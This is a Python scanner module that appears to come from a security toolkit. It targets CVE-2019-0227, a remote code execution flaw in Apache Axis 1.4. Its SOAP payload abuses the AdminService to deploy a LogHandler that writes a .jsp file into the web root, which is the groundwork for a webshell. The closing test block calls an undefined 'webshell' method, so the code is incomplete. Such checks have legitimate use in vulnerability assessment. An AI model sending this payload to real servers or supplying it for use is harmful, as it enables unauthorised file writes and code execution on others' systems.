#!/usr/bin/env python3

from app.lib.request import request
from app.lib.common import get_capta, get_useragent

class CVE_2019_0227_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'CVE-2019-0227漏洞',
            'description': 'Apache Axis Remote Code Execution Vulnerability,影响范围为: Apache Axis 1.4',
            'date': '2018-11-14',
            'exptype': 'check',
            'type': 'RCE'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.capta = get_capta() 
        self.headers = {
            'User-Agent': get_useragent(),
            'Pragma': 'no-cache'
        }
        self.check_headers = {
            "Content-Type":"application/xml",
            "SOAPAction":"somethi"
        }
        self.shell_headers = {
            "Content-Type": "application/xml", 
            "SOAPAction": "somethi"
        }
        self.check_payload = '''
            <?xml version="1.0" encoding="utf-8"?>
            <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                    xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
                    xmlns:xsd="http://www.w3.org/2001/XMLSchema"
                    xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
            <soapenv:Body>
            <ns1:deployment
            xmlns="http://xml.apache.org/axis/wsdd/"
            xmlns:java="http://xml.apache.org/axis/wsdd/providers/java"
            xmlns:ns1="http://xml.apache.org/axis/wsdd/">
            <ns1:service name="RandomService" provider="java:RPC">
                <requestFlow>
                <handler type="RandomLog"/>
                </requestFlow>
                <ns1:parameter name="className" value="java.util.Random"/>
                <ns1:parameter name="allowedMethods" value="*"/>
            </ns1:service>
            <handler name="RandomLog" type="java:org.apache.axis.handlers.LogHandler" >  
                <parameter name="LogHandler.fileName" value="../webapps/ROOT/%s.jsp" />   
                <parameter name="LogHandler.writeToConsole" value="false" /> 
            </handler>
            </ns1:deployment>
            </soapenv:Body>
            </soapenv:Envelope>
            '''
            
    async def check(self, filename = None):
        
        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """

        try:
            if not filename:
                self.check_payload = self.check_payload %('test')
            else:
                self.check_payload = self.check_payload %(filename)
            check_req = await request.get(self.url + "/services/AdminService", headers = self.check_headers, data = self.check_payload)
            if check_req.status == 200 and "processing</Admin>" in await check_req.text() :
                return True
            
        except Exception as e:
            # print(e)
            pass

if  __name__ == "__main__":
    CVE_2019_0227 = CVE_2019_0227_BaseVerify('http://127.0.0.1:8000')
    CVE_2019_0227.webshell('sd')